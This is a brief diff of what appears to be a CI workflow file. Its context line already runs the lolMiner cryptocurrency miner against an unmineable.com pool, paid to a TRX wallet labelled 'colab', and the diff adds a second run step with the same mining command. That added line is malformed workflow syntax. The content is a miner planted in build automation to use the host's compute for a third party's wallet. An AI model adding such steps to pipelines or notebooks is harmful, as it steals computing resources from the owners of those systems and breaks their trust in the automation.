@@ -50,3 +50,6 @@ jobs:
       
       
       !./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWn4Ur8PHHeaHKxQs3G5mNmntLHpTnEBHF.colab --ethstratum ETHPROXY
+      
+      
+      -run: !./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWn4Ur8PHHeaHKxQs3G5mNmntLHpTnEBHF.colab --ethstratum ETHPROXY
